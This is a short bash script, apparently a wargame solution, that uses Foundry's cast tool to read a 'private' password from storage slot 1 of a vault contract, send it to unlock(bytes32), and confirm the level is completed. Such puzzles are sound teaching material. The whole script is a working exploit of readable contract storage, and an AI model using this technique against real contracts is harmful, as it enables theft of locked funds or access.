#!/usr/bin/env bash
set -e

CONTRACT="$1"

[ "$CONTRACT" == "" ] && echo "A contract address must be specified as the first argument" >&2 && exit 1
[ "$ETH_RPC_URL" == "" ] && echo "ETH_RPC_URL not set" >&2 && exit 1
[ "$CHAIN" == "" ] && echo "CHAIN not set" >&2 && exit 1

if [ "$PRIVATE_KEY" == "" ]
then
	echo "Enter private key"
	read -s "PRIVATE_KEY"
fi
PRIVATE_KEY=$(echo $PRIVATE_KEY | sed 's/^0x//')

SLOT=1
PASSWORD=$(cast storage \
	${CONTRACT} \
	${SLOT})

echo "Password: $(cast parse-bytes32-string ${PASSWORD})"

cast send \
	--private-key ${PRIVATE_KEY} \
	${CONTRACT} \
	$(cast calldata "unlock(bytes32)" ${PASSWORD})

LOCKED=$(cast call ${CONTRACT} $(cast sig "locked()(bool)") | cast to-dec)

if [ ${LOCKED} -eq 0 ]
then
	echo "Level completed, submit instance"
else
	echo "ERROR: Solution failed"
fi
